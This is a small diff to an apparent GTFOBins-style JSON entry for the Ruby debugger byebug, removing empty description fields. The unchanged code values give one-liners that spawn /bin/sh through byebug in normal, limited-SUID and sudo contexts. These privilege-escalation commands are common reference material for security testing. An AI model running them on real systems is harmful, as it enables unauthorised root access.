@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
       }
     ]
